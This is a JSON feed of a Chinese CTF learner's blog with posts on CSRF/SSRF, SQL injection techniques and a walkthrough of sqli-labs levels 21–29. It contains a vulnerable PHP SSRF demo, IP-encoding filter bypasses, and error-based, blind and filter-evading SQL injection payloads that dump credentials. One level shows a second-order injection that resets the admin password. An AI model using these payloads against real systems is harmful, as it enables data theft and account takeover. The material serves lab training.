{
    "version": "https://jsonfeed.org/version/1",
    "title": "",
    "subtitle": "",
    "icon": "https://blog.xcu.icu/images/favicon.ico",
    "description": "一个想要全栈的 CTFer，目前是个废物",
    "home_page_url": "https://blog.xcu.icu",
    "items": [
        {
            "id": "https://blog.xcu.icu/2022/10/31/CSRF&SSRF/",
            "url": "https://blog.xcu.icu/2022/10/31/CSRF&SSRF/",
            "title": "CSRF&SSRF",
            "date_published": "2022-10-30T16:00:00.000Z",
            "content_html": "<h2 id=\"CSRF简介\"><a href=\"#CSRF简介\" class=\"headerlink\" title=\"CSRF简介\"></a>CSRF简介</h2><p>CSRF是指跨站请求伪造，跨站请求伪造（英语：Cross-site request forgery，也被称为[one-click attack]或者[session riding]，通常缩写为CSRF或者XSRF，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>\n<p>扯那么多，简单的理解就是盗用了用户的身份，以用户的名义进行非法操作</p>\n<h2 id=\"CSRF的工作原理\"><a href=\"#CSRF的工作原理\" class=\"headerlink\" title=\"CSRF的工作原理\"></a>CSRF的工作原理</h2><p>当我们打开一个网站后，我们的浏览器会与服务器产生一个会话，在这个会话中，我们可以正常的使用我们的权限对网站进行操作，比如登录博客可以删除或发布文章，当会话结束后，再进行这些操作时就会提示会话过期请重新登录。</p>\n<p>上述是我们正常的一个会话过程，而CSRF就是建立在会话上，比如我们登录网上银行转账的过程中，点击了一个攻击者构造的一个转账业务代码，那么我们账号中的余额就会被盗走，一直到现在说的都是CSRF的过程，那么为什么会这样呢，在浏览器与服务器的会话中所有的操作都被默认为是可信的所以执行了攻击者构建的转账代码</p>\n<h3 id=\"漏洞形成条件\"><a href=\"#漏洞形成条件\" class=\"headerlink\" title=\"漏洞形成条件\"></a>漏洞形成条件</h3><ol>\n<li>CSRF攻击建立在会话下</li>\n<li>欺骗用户访问url</li>\n</ol>\n<h2 id=\"CSRF攻击\"><a href=\"#CSRF攻击\" class=\"headerlink\" title=\"CSRF攻击\"></a>CSRF攻击</h2><p>CSRF攻击是攻击者通过受害者的cookie骗取服务器的信任，但是攻击者并没有获取到Cookie，也看不到Cookie信息。另外，由于浏览器同源策略的限制，黑客无法从返回的结果中得到任何信息，CSRF所能做的就是给服务器发送请求</p>\n<h2 id=\"CSRF防御\"><a href=\"#CSRF防御\" class=\"headerlink\" title=\"CSRF防御\"></a>CSRF防御</h2><p>CSRF漏洞的预防没有其他漏洞那么麻烦，只需要在一些地方增加一些小操作就好</p>\n<h3 id=\"二次确认-amp-token验证\"><a href=\"#二次确认-amp-token验证\" class=\"headerlink\" title=\"二次确认&amp;token验证\"></a>二次确认&amp;token验证</h3><p>在调用某些功能时进行二次验证，比如删除用户时，产生提示对话框，需要二次确认，再如转账时需要再次输入密码</p>\n<h2 id=\"SSRF简介\"><a href=\"#SSRF简介\" class=\"headerlink\" title=\"SSRF简介\"></a>SSRF简介</h2><p>多数web应用都提供了从其他服务器获取数据的功能，根据用户指定的url来下载文件，读取文件等。如果这种功能被恶意利用，那么就有可能导致存在缺陷的web应用被作为跳板去攻击本地或者远程服务器，这种形式的攻击被称为SSRF</p>\n<h2 id=\"SSRF形成原理\"><a href=\"#SSRF形成原理\" class=\"headerlink\" title=\"SSRF形成原理\"></a>SSRF形成原理</h2><p>SSRF的主要形成原理是服务端提供了从其他服务器获取数据的功能，但是没有对目标地址进行有效的过滤或者限制导致的。</p>\n<p>demo</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>原本是用来获取图片返回给用户的，但是构造</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>就可以探测8000端口的开放情况</p>\n<h2 id=\"防护绕过\"><a href=\"#防护绕过\" class=\"headerlink\" title=\"防护绕过\"></a>防护绕过</h2><p>防护主要是对请求进行过滤</p>\n<ol>\n<li>设置白名单</li>\n<li>禁止请求内网ip</li>\n</ol>\n<p>绕过也不难</p>\n<ol>\n<li>使用<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tQGV2YWwuY29t6L+Z56eN5qC85byP57uV6L+H5q2j5YiZLw==\">http://example.com@eval.com这种格式绕过正则</span></li>\n<li>使用其他进制，或者是简写ip<ul>\n<li>0177.00.00.01（八进制）</li>\n<li>2130706433(十进制)</li>\n<li>0x7f.0x0.0x0.1x0.0x1（十六进制）</li>\n<li>127.1</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h2><h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><p>访问内网ip加端口号，根据响应时间回显来判断端口是否开放</p>\n<h3 id=\"指纹识别\"><a href=\"#指纹识别\" class=\"headerlink\" title=\"指纹识别\"></a>指纹识别</h3><p>大部分web应用有一些独特的文件或者目录，可以通过这些特征来判断应用类型，详细版本，以此更好的进行漏洞利用</p>\n<h3 id=\"文件读取\"><a href=\"#文件读取\" class=\"headerlink\" title=\"文件读取\"></a>文件读取</h3><p>配合file伪协议，可以读取敏感文件</p>\n",
            "tags": [
                "Web",
                "web"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/30/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "url": "https://blog.xcu.icu/2022/10/30/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "title": "报错注入",
            "date_published": "2022-10-29T16:00:00.000Z",
            "content_html": "<h2 id=\"前言；\"><a href=\"#前言；\" class=\"headerlink\" title=\"前言；#\"></a>前言；<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzQwNjMyMjA5ODc=\">#</span></h2><p>因为当时学习的时候，对于这一块手注太麻烦，所以大致了解了一下原理和语句就跑路了，现在又想到这一块，所以回来把这一块再总结一下。</p>\n<h2 id=\"1、什么是盲注\"><a href=\"#1、什么是盲注\" class=\"headerlink\" title=\"1、什么是盲注#\"></a>1、什么是盲注<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzUzNDk2NzUyMQ==\">#</span></h2><p>首先sql注入是因为开发者对用户输入的数据没有进行严格的过滤，导致攻击者通过在规定语句后加入其他恶意查询语句，达到在管理员不知情的情况下查询到数据库数据，而盲注就是在页面没有回显的情况下去判断数据是否正确。</p>\n<h2 id=\"2、报错注入\"><a href=\"#2、报错注入\" class=\"headerlink\" title=\"2、报错注入#\"></a>2、报错注入<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzI0MDk2OTE4MjE=\">#</span></h2><p>报错注入就是在页面没有回显的情况下，尝试引起报错回显到页面上来引起报错，而我们需要的数据就会在报错中显示出来</p>\n<p>而报错注入也分为两种，数据库bug报错和函数报错</p>\n<p>首先数据库bug报错，主要是因为主键的唯一性，在select floor(rand(0)<em>2),count(</em>) from users group by floor(rand(0)*2);导致主键冲突，详见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAxNTYwMS5odG1s\">floor报错注入原理 - Joker-qi - 博客园 (cnblogs.com)</span></p>\n<p>接着是函数报错，常用的有updataxml和extractvalue两个函数的报错注入。</p>\n<p>首先是updataxml函数的报错注入；</p>\n<p>常见报错语句payload；格式；and updataxml(1,concat(0x7e,注入语句,0x7e),1)–+</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and updatexml(1,concat(0x7e,database(),0x7e),1)-- \nand updatexml(1,concat(substr(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1)),1)-- \nand updatexml(1,concat(0x5e,(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1)),0x5e),1)-- \nand updatexml(0x5e,databse(),0x5e)-- <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这个函数的报错原理是concat将字符连接会不符合xpath-string格式导致抛出异常，而报出我们需要的数据,这个函数会限制返回字符长度，为32位，我们可以配合mid(),left(),substr()和right()等函数使用来爆出全部数据。</p>\n<p>对于extractvalue函数和updataxml函数用法一样，比updataxml少了后面的一个字符。</p>\n<h2 id=\"3、布尔盲注\"><a href=\"#3、布尔盲注\" class=\"headerlink\" title=\"3、布尔盲注#\"></a>3、布尔盲注<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzI5MTIyNjA2Ng==\">#</span></h2><p>布尔是计算机中的两种类型，ture和false两种，即页面回显正常和回显不正常</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and length(database())&#x3D;X --+ 当X&#x3D;8是页面回显正常，此时我们可以判断该数据库的库名有八个字段组成<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>先判断出数据库长度</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and ascii(substr(database(),1,1))&#x3D;115 --+对其进行逐个爆破<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>知道判断出八个字符组成数据库名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;X --+当X&#x3D;6的时候我们发现网页给我们回显正常，此次我们可以确定第一个表的是由6个字符组成的<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>第一个表是6个字段，可以通过改limit中的数来猜不同的表</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;100 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆第一表</p>\n<h2 id=\"4、时间盲注\"><a href=\"#4、时间盲注\" class=\"headerlink\" title=\"4、时间盲注#\"></a>4、时间盲注<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzE4MDIyMDQ2MDU=\">#</span></h2><p> 时间盲注，通过写入对时间敏感的语句，来通过响应时间的长短来判断是否执行成功</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and if(length(database())&gt;8,sleep(2),0) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>判断数据库长度</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"> and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),0) --+\n此为判断第一个字母的ascii码是否为115<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>判断数据库名字</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;‘security’ limit x,y),z,d))&#x3D;e,sleep(1),0)–+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n",
            "tags": [
                "Web",
                "SQL注入"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/30/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/",
            "url": "https://blog.xcu.icu/2022/10/30/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/",
            "title": "基于sqli-labs进阶学习",
            "date_published": "2022-10-29T16:00:00.000Z",
            "content_html": "<p>前20关做完，我们对sql有了大致的了解，也知道了sql的一些注入的方法</p>\n<h2 id=\"第二十一，二十二关\"><a href=\"#第二十一，二十二关\" class=\"headerlink\" title=\"第二十一，二十二关#\"></a>第二十一，二十二关<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzQ5Njc5ODg5Ng==\">#</span></h2><p>打开二十一题</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314214932734-710390486.png\" alt=\"img\"></p>\n<p>先用弱密码登录</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314214939689-1621598753.png\" alt=\"img\"></p>\n<p>和二十关一样，但是这个题cookie经过base64加密，我们只需要上传paylaod的时候用base64加密</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314214944217-569694909.png\" alt=\"img\"></p>\n<p>我们抓包</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314214949532-801792399.png\" alt=\"img\"></p>\n<p>发送到重发器开始构造paylaod</p>\n<p>我们先用单引号测试</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314214955838-64854703.png\" alt=\"img\"></p>\n<p>我们可以看结果</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215002203-999866100.png\" alt=\"img\"></p>\n<p>可以知道他是’）闭合</p>\n<p>我们用联合查询判断一下回显位</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215036054-1228242957.png\" alt=\"img\"></p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215041779-2055167986.png\" alt=\"img\"></p>\n<p>可以看到回显2，3位</p>\n<p>然后爆库</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215052621-1209198386.png\" alt=\"img\"></p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215101616-384752131.png\" alt=\"img\"></p>\n<p>其他参考二十关用base64编码</p>\n<p>二十二关将闭合改为“</p>\n<h2 id=\"第二十三关\"><a href=\"#第二十三关\" class=\"headerlink\" title=\"第二十三关#\"></a>第二十三关<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzI0NDEzNzcxNTA=\">#</span></h2><p>打开这个题</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215109712-1756543826.png\" alt=\"img\"></p>\n<p>emmm咋看咋眼熟，先给它一个id</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215118530-1605380413.png\" alt=\"img\"></p>\n<p>加一个单引号引起报错</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215124087-621715258.png\" alt=\"img\"></p>\n<p>看报错部分，很明显是单引号闭合</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215131858-767572675.png\" alt=\"img\"></p>\n<p>这里本想直接做出来，但它报错，试了一下#和%28还是报错，去翻了一下源码</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215140911-1100520380.png\" alt=\"img\"></p>\n<p>发现这里过滤了–和#</p>\n<p>于是我们改成单引号闭合</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215156265-1792235616.png\" alt=\"img\"></p>\n<p>我们爆数据库</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215204391-207199787.png\" alt=\"img\"></p>\n<p>接下来参考第一关</p>\n<p>GET和POST差别在于，GET只需要提交参数<code>id</code>，而POST则需要<code>username</code>与<code>password</code>都正确。</p>\n<h1 id=\"二次注入，第二十四关\"><a href=\"#二次注入，第二十四关\" class=\"headerlink\" title=\"二次注入，第二十四关\"></a>二次注入，第二十四关</h1><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>\n<p>打开这个题</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215219200-1169398446.png\" alt=\"img\"></p>\n<p>发现是一个登录界面，左边是忘了你的密码？右边是建立一个新用户？</p>\n<p>这题的目的是用管理员账号登录他</p>\n<p>根据二次注入的原理，我们先创建一个admin’#用户</p>\n<p>原因是因为我们改admin’#的密码时，Sql语句变为：UPDATE users SET passwd&#x3D;“New_Pass” WHERE username &#x3D;’ admin’ # ’ AND password&#x3D;’</p>\n<p>#后面的被注释了，也就是执行了UPDATE users SET passwd&#x3D;“New_Pass” WHERE username &#x3D;’ admin’ <img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215242131-111730886.png\" alt=\"img\"></p>\n<p>建立admin’#用户密码为123321</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215250347-1968348080.png\" alt=\"img\"></p>\n<p>5秒后重定向到首页，我们用admin‘#登录</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215258224-1653327191.png\" alt=\"img\"></p>\n<p>可以看到，这里只有一个改密码的地方，我们更改密码为123456</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215306464-1671895208.png\" alt=\"img\"></p>\n<p>更改成功</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215313922-1700887697.png\" alt=\"img\"></p>\n<p>这个时候admin的密码也改成了123456，然后我们用admin登录</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215320556-1141005338.png\" alt=\"img\"></p>\n<p>注入成功</p>\n<h1 id=\"第二十五关，过滤了or和and\"><a href=\"#第二十五关，过滤了or和and\" class=\"headerlink\" title=\"第二十五关，过滤了or和and\"></a>第二十五关，过滤了or和and</h1><p>源码分析</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215327371-103763484.png\" alt=\"img\"></p>\n<p>这里将or和and替换成了空格，这里的正则匹配<code>//i</code>同时匹配大小写，所以不能用大小写绕过。</p>\n<p>有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：</p>\n<p>若是一次性的，且只是将过滤字符换成了空字符：</p>\n<p>双写——or&#x3D;oorr、and&#x3D;anandd 若是非一次性的，就要考虑一些变形：</p>\n<p>大小写变形——or&#x3D;Or&#x3D;oR&#x3D;OR 利用运算符——or&#x3D;&amp;&amp;、and&#x3D;|| URL编码——#&#x3D;%23，Hex编码——~&#x3D;0x7e 添加注释——&#x2F;<em>or</em>&#x2F;</p>\n<p>先判断注入点</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215334877-1098248321.png\" alt=\"img\"></p>\n<p>可以看报错部分，可以知道是单引号闭合，有报错，可以用报错注入和联合查询</p>\n<h2 id=\"判断列数\"><a href=\"#判断列数\" class=\"headerlink\" title=\"判断列数#\"></a>判断列数<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzMwMTcxNjU0OTc=\">#</span></h2><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215341516-1612180917.png\" alt=\"img\"></p>\n<p>这里因为他替换了or和and为空格，所以对于所有or和and双写就可以突破</p>\n<p>构造payload</p>\n<p>?id&#x3D;1’ union select 1,2,3–+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215349803-2102960858.png\" alt=\"img\"></p>\n<h2 id=\"爆库\"><a href=\"#爆库\" class=\"headerlink\" title=\"爆库#\"></a>爆库<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzM2NzY2NjM5NDg=\">#</span></h2><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215354986-1994947079.png\" alt=\"img\"></p>\n<p>这是当前数据库，用?id&#x3D;-1’ union select 1,2,(select group_concat(schema_name) from infoorrmation_schema.schemata)–+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215403563-245807171.png\" alt=\"img\"></p>\n<p>information_schema.schemata 是所有数据库名的表</p>\n<h2 id=\"第二十五A关\"><a href=\"#第二十五A关\" class=\"headerlink\" title=\"第二十五A关#\"></a>第二十五A关<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzEyOTY3ODc4OTk=\">#</span></h2><p>数字型注入<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215417424-721011753.png\" alt=\"img\"></p>\n<p>其余和第二十五关一样，但因为没有报错不能用报错注入</p>\n<h1 id=\"第二十六关\"><a href=\"#第二十六关\" class=\"headerlink\" title=\"第二十六关\"></a>第二十六关</h1><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215442975-571429146.png\" alt=\"img\"></p>\n<p>可以看到，这个题过滤了一大堆乱七八糟的字符 怎么说这里可以用updatexml报错注入没有空格问题</p>\n<h2 id=\"爆库-1\"><a href=\"#爆库-1\" class=\"headerlink\" title=\"爆库#\"></a>爆库<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzY2MDY2OTUxNg==\">#</span></h2><p>?id&#x3D;-1’||updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e)||’1’&#x3D;’1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215449536-1024038249.png\" alt=\"img\"></p>\n<h2 id=\"接下来爆表\"><a href=\"#接下来爆表\" class=\"headerlink\" title=\"接下来爆表#\"></a>接下来爆表<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzI2OTU5MDExMjQ=\">#</span></h2><p>?id&#x3D;-1’||updatexml(0x7e,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;’security’)),0x7e),0x7e)||’1’&#x3D;’1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215456120-225778617.png\" alt=\"img\"></p>\n<h2 id=\"然后爆段\"><a href=\"#然后爆段\" class=\"headerlink\" title=\"然后爆段#\"></a>然后爆段<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzY3MTM3MDI1MQ==\">#</span></h2><p>?id&#x3D;-1’||updatexml(0x7e,concat(0x7e,(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name&#x3D;’users’)),31)),0x7e),0x7e)||’1’&#x3D;’1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215505343-645132761.png\" alt=\"img\"></p>\n<h2 id=\"接下来爆用户名和密码\"><a href=\"#接下来爆用户名和密码\" class=\"headerlink\" title=\"接下来爆用户名和密码#\"></a>接下来爆用户名和密码<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzIyMjc3MTkwMQ==\">#</span></h2><p>?id&#x3D;-1’||updatexml(0x7e,concat(0x7e,(substr((select(group_concat(username,0x7e,passwoorrd))from(users)),31)),0x7e),0x7e)||’1’&#x3D;’1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215513617-792628255.png\" alt=\"img\"></p>\n<p>这样这题就做完了</p>\n<h2 id=\"第二十六A题\"><a href=\"#第二十六A题\" class=\"headerlink\" title=\"第二十六A题#\"></a>第二十六A题<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzM4OTQyNDcxMw==\">#</span></h2><p>和第二十五A题一样，不能用报错注入，闭合为‘）可以用盲注和联合查询</p>\n<p>第二十七题</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215522803-204990058.png\" alt=\"img\"></p>\n<p>看到这个源码，他比二十六多了select、union、UNION、SELECT、Union和Select</p>\n<p>emmmm他也没全都过滤，还是可以用不同位置的大小写突破</p>\n<h2 id=\"参照第二十六爆库\"><a href=\"#参照第二十六爆库\" class=\"headerlink\" title=\"参照第二十六爆库#\"></a>参照第二十六爆库<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzI0MDA4NTU3NTU=\">#</span></h2><p>?id&#x3D;1’||updatexml(1,concat(0x7e,database(),0x7e),1)||’1’&#x3D;’1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215530993-726455020.png\" alt=\"img\"></p>\n<h2 id=\"接着爆表\"><a href=\"#接着爆表\" class=\"headerlink\" title=\"接着爆表#\"></a>接着爆表<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzI3ODMxMDMwOTY=\">#</span></h2><p>?id&#x3D;1’||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;’security’)),0x7e),1)||’1’&#x3D;’1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215537462-107111446.png\" alt=\"img\"></p>\n<p>其余过程见二十六题，union和select的使用用大小写突破</p>\n<h1 id=\"第二十七A题\"><a href=\"#第二十七A题\" class=\"headerlink\" title=\"第二十七A题\"></a>第二十七A题</h1><p>与二十七题一样，双引号闭合</p>\n<h1 id=\"第二十八题\"><a href=\"#第二十八题\" class=\"headerlink\" title=\"第二十八题\"></a>第二十八题</h1><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215544352-1499653348.png\" alt=\"img\"></p>\n<p>没有过滤or与and。过滤了相连的union和select，&#x2F;i同时匹配大小写，\\s匹配任意空白字符如制表符、换行符、空格等，使用%a0可以绕过。过滤了–、#以及&#x2F;**&#x2F;。过滤了两次空格。过滤了&#x2F;但没过滤\\。</p>\n<p>双写绕过即可</p>\n<h1 id=\"第二十九题\"><a href=\"#第二十九题\" class=\"headerlink\" title=\"第二十九题\"></a>第二十九题</h1><p>打开这个题</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215552921-1747522089.png\" alt=\"img\"></p>\n<p>这个网站受到世界上最好的防火墙保护</p>\n<p>emmm又提示Please input the ID as parameter with numeric value</p>\n<p>就试着给他一个id</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215558844-222280462.png\" alt=\"img\"></p>\n<p>登上了，那就判断一下闭合，试试爆库，</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215608030-1776857352.png\" alt=\"img\"></p>\n<p>爆出来了，错误的方法说完了，试试可刑的正确方法</p>\n<h3 id=\"知识补充\"><a href=\"#知识补充\" class=\"headerlink\" title=\"知识补充#\"></a>知识补充<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzM2NzgzODI5NjQ=\">#</span></h3><h4 id=\"服务器端有两个部分：\"><a href=\"#服务器端有两个部分：\" class=\"headerlink\" title=\"服务器端有两个部分：#\"></a>服务器端有两个部分：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjIwMi5odG1sIzMyOTk2MjQyMjU=\">#</span></h4><p>第一部分为 tomcat 为引擎的 jsp 型服务器 第二部分为 apache 为引擎的 php 服务器 真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 